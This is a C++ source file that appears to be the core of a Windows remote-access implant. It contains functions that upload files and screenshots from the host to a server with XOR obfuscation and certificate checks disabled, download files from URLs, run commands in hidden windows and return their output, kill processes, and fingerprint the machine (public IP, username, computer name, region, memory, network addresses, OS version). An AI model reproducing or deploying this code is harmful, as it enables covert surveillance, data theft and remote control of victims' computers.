#include "core.h"


//Encodes and sends data in one easy function
//Returns string output
std::string sendEncodedString(struct Strings* strings, std::string key, std::string data, std::string endpoint, HANDLE hConnect) {
	std::string result = encode(key, data);
	HANDLE hRequest = HttpOpenRequestA(hConnect, strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, (LPVOID)result.c_str(), result.length());
	if (reqSuccess) {
		DWORD receivedData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
		{
			chunk.resize(receivedData);
			buf += chunk;
		}
		return decode(key, buf);
	}
	return "Error";
}


//Uploads file to server via HTTP POST
//Params: handle for internet, path of file to upload, key for XOR "encryption" 
BOOL doFileUpload(struct Strings* strings, HANDLE hConnect, char* filepath, int xorKey, std::string endpoint) {
	char data[2048] = {};
	DWORD bytesWritten = 0;
	DWORD bytesRead = 0;
	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile)
		return FALSE;
	DWORD dataSize = GetFileSize(hFile, NULL);

	HANDLE hRequest = HttpOpenRequestA(hConnect,  strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	HttpAddRequestHeadersA(hRequest, strings->uploadheaders.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);

	INTERNET_BUFFERSA bufferIn;
	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	
	bufferIn.dwBufferTotal = strings->uploadheadfile.length() + dataSize + strings->uploadtail.length();

	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
	InternetWriteFile(hRequest, (const void*)strings->uploadheadfile.c_str(), strings->uploadheadfile.length(), &bytesWritten);
	do {
		if (!ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL)) {
			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
			return FALSE;
		}
		for (UINT b = 0; b < bytesRead; b++) {
			data[b] ^= xorKey;
		}
		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
	} while (bytesRead == sizeof(data));
	InternetWriteFile(hRequest, (const void*)strings->uploadtail.c_str(), strings->uploadtail.length(), &bytesWritten);
	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
	return TRUE;
}


//Uploads screenshot to server via HTTP POST
//Params: handle for internet, path of file to upload, key for XOR "encryption" 
BOOL doScreenshotUpload(struct Strings* strings, HANDLE hConnect, std::vector<BYTE> bmp, int xorKey, std::string endpoint) {
	char data[2048] = {};
	DWORD bytesWritten = 0;
	DWORD bytesRead = 0;


	HANDLE hRequest = HttpOpenRequestA(hConnect, strings->post.c_str(), endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	HttpAddRequestHeadersA(hRequest, strings->uploadheaders.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);

	INTERNET_BUFFERSA bufferIn;
	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	bufferIn.dwBufferTotal = strings->uploadheadscreenshot.length() + bmp.size() + strings->uploadtail.length();

	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
	InternetWriteFile(hRequest, (const void*)strings->uploadheadscreenshot.c_str(), strings->uploadheadscreenshot.length(), &bytesWritten);
	UINT b = 0;
	for (BYTE n : bmp) {
		if (b >= sizeof(data)) {
			InternetWriteFile(hRequest, (const void*)data, b, &bytesWritten);
			b = 0;
		}
		data[b] = n ^ xorKey;
		b++;
	}
	if (b > 0)
		InternetWriteFile(hRequest, (const void*)data, b, &bytesWritten);

	InternetWriteFile(hRequest, (const void*)strings->uploadtail.c_str(), strings->uploadtail.length(), &bytesWritten);
	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
	return TRUE;
}


//Downloads file to path
BOOL doFileDownload(std::string url, std::string filepath) {
	if (S_OK == URLDownloadToFileA(NULL, url.c_str(), filepath.c_str(), 0, NULL))
		return TRUE;
	return FALSE;
}


//Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
//Returns string buffer containing command output 
std::string execCmd(struct Strings* strings, std::string cmd, DWORD MAX_TIME) {
	nlohmann::json jsonInfo;
	jsonInfo["command"] = cmd;
	std::string output;
	cmd = strings->cmd + cmd;
	HANDLE hPipeRead;
	HANDLE hPipeWrite;

	SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
		return jsonInfo.dump();

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = hPipeWrite;
	si.hStdError = hPipeWrite;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = { 0 };

	BOOL fSuccess = CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!fSuccess)
	{
		CloseHandle(hPipeWrite);
		CloseHandle(hPipeRead);
		return jsonInfo.dump();
	}

	SYSTEMTIME startTime, currentTime;
	FILETIME startFTime, currentFTime;
	GetSystemTime(&startTime);
	GetSystemTime(&currentTime);
	SystemTimeToFileTime(&startTime, &startFTime);
	SystemTimeToFileTime(&currentTime, &currentFTime);


	BOOL bProcessEnded = FALSE;
	while (!bProcessEnded && currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME) {
		GetSystemTime(&currentTime);
		SystemTimeToFileTime(&currentTime, &currentFTime);
		bProcessEnded = WaitForSingleObject(pi.hProcess, 250) == WAIT_OBJECT_0;

		while (currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME) {
			GetSystemTime(&currentTime);
			SystemTimeToFileTime(&currentTime, &currentFTime);
			char buf[2048];
			DWORD dwRead = 0;
			DWORD dwAvail = 0;

			if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
				break;
			if (!dwAvail)
				break;
			if (!ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
				break;

			buf[dwRead] = 0;
			output += buf;
		}
	}
	CloseHandle(hPipeWrite);
	CloseHandle(hPipeRead);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	jsonInfo["output"] = output;
	return jsonInfo.dump();
}


// Takes in request handle, returns string based on response
std::string sendRequestGetResponse(HANDLE hRequest) {
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
	if (reqSuccess) {
		DWORD receivedData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
		{
			chunk.resize(receivedData);
			buf += chunk;
		}
		return buf;
	}
	return "Error";
}


//Gathers OS information via ProductName and DisplayVersion registry keys, returns string
std::string getOSInfo(struct Strings* strings) {
	nlohmann::json jsonInfo;
	char value[256];
	DWORD BufferSize = 255;
	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->productname.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	value[BufferSize] = 0;
	jsonInfo["ProductName"] = value;
	RegGetValueA(HKEY_LOCAL_MACHINE, strings->regsubkey.c_str(), strings->displayversion.c_str(), RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	jsonInfo["DisplayVersion"] = value;
	return jsonInfo.dump();
}


//Attempts to get public IP of user by reaching out to ifconfig.me
std::string getPublicIP(HANDLE hInternet) {
	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	std::string resp = sendRequestGetResponse(hRequest);
	if (hRequest)
		InternetCloseHandle(hRequest);
	if (hConnect)
		InternetCloseHandle(hConnect);
	return resp;
}


//Gets list of current running processes and converts to string
std::string getProcToStr() {
	nlohmann::json jsonInfo;
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		std::wstring ws(procEntry.szExeFile);
		std::string str(ws.begin(), ws.end());
		char buf[UNLEN + 1];
		DWORD len = UNLEN + 1;
		_itoa_s(procEntry.th32ProcessID, buf, 10);
		buf[UNLEN] = 0;
		jsonInfo[buf] = str;
	} while (Process32Next(hTH32, &procEntry));
	return jsonInfo.dump();
}


//Kills process PID
BOOLEAN killProcess(DWORD pid) {
	std::string proclst;
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	Process32First(hTH32, &procEntry);
	do
	{
		if (procEntry.th32ProcessID == pid) {
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, NULL, procEntry.th32ProcessID);
			return TerminateProcess(hProcess, 0);
		}
	} while (Process32Next(hTH32, &procEntry));
	return FALSE;
}


//Gets list of network interfaces and converts MAC/IP addresses to comma-separated string
std::string getNetworkInfo() {
	nlohmann::json jsonInfo;

	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		return "";
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			return "";
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		int i = 0;
		while (pAdapter) {
			jsonInfo[i] = pAdapter->IpAddressList.IpAddress.String;
			pAdapter = pAdapter->Next;
			i++;
		}
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
	return jsonInfo.dump();
}


/*
Gathers all info from device and converts to string. Basically just calls a bunch of the other functions and combines the output.
Currently includes: public IP, username, computer name, geolocation, memory amount, IP addresses, OS version info
Output Format: publicIP&username&computername&iso2&memory&ip1,ip2,ip3...&osInfo
*/
std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
	nlohmann::json jsonInfo;
	
	jsonInfo["publicip"] = getPublicIP(hInternet);

	char username[UNLEN + 1];
	DWORD len = UNLEN + 1;

	BOOL getUserSuccess = GetUserNameA(username, &len);
	if (getUserSuccess) {
		jsonInfo["username"] = username;
	}
	else {
		jsonInfo["username"] = "N/A";
	}

	char computername[UNLEN + 1];
	DWORD len2 = UNLEN + 1;

	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
	if (getComputerNameSuccess) {
		jsonInfo["computername"] = computername;
	}
	else {
		jsonInfo["computername"] = "N/A";
	}

	GEOID g = GetUserGeoID(GEOCLASS_NATION);
	char iso2[UNLEN + 1];
	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
	jsonInfo["region"] = iso2;

	ULONGLONG memqty = 0;
	GetPhysicallyInstalledSystemMemory(&memqty);
	char memqtystr[UNLEN + 1];
	_ui64toa_s(memqty, memqtystr, UNLEN, 10);

	jsonInfo["memory"] = memqtystr;
	jsonInfo["netinfo"] = getNetworkInfo();
	jsonInfo["osinfo"] = getOSInfo(strings);
	return jsonInfo.dump();
}